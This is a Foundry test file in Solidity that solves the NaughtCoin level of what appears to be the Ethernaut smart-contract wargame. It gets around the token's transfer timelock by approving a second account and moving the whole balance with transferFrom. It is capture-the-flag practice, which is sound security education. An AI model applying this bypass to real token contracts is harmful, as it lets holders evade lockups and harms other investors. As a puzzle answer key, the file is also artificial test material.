pragma solidity ^0.8.0;

import 'forge-std/Test.sol';
import 'levels/NaughtCoinFactory.sol';
import 'levels/NaughtCoin.sol';
import 'utils/TestUtils.sol';

contract NaughtCoinTest is Test {
  address[] users;
  Utils utils;
  NaughtCoinFactory naughtCoinFactory;
  address payable naughtCoinAddress;
  NaughtCoin naughtCoin;

  function setUp() public {
    utils = new Utils();
    users = utils.createUsers(2);
    naughtCoinFactory = new NaughtCoinFactory();
    naughtCoinAddress = payable(naughtCoinFactory.createInstance(users[0]));
    naughtCoin = NaughtCoin(naughtCoinAddress);
  }

  function testHack() public {
    uint256 balance = naughtCoin.balanceOf(users[0]);

    vm.prank(users[0]);
    naughtCoin.approve(users[1], balance);

    vm.prank(users[1]);
    naughtCoin.transferFrom(users[0], users[1], balance);

    assertTrue(naughtCoinFactory.validateInstance(naughtCoinAddress, users[0]), 'Level not solved');
  }
}
